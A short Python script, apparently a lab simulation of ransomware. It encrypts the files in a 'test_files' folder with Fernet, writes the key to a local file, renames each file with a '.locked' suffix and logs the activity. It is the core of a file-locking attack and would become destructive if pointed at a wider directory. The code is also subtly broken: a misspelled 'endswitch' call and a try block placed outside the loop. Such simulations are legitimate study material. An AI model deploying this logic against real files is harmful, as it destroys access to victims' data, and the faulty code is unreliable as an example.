import os
import logging
from cryptography.fernet import Fernet

logging.basicConfig(
    filename="logs/activity.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# Only operate inside this folder
TEST_DIR = "test_files"

# Generate and save key
def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
    return key

def encrypt_files():
    key = generate_key()
    cipher = Fernet(key)

    # Safety check: ensure directory exists
    if not os.path.exists(TEST_DIR):
        print("[ERROR] test_files directory not found.")
        return
    
    for filename in os.listdir(TEST_DIR):
        file_path = os.path.join(TEST_DIR, filename)

        # Skip directories and already encrypted files
        if os.path.isdir(file_path) or filename.endswitch(".locked"):
            continue
    try:
        with open(file_path, "rb") as f:
            file_data = f.read()

        encrypted_data = cipher.encrypt(file_data)

        # Write encrypted data back
        with open(file_path, "wb") as f:
            f.write(encrypted_data)

        new_file_path = file_path + ".locked"
        os.rename(file_path, new_file_path)

        print(f"[ENCRYPTED] {filename} -> {filename}.locked")
        logging.info(f"Encrypted file: {filename}")
    except Exception as e:
        print(f"[ERROR] Failed to encrypt {filename}")
        logging.error(f"Error encrypting {filename}: {e}")
        
if __name__ == "__main__":
    encrypt_files()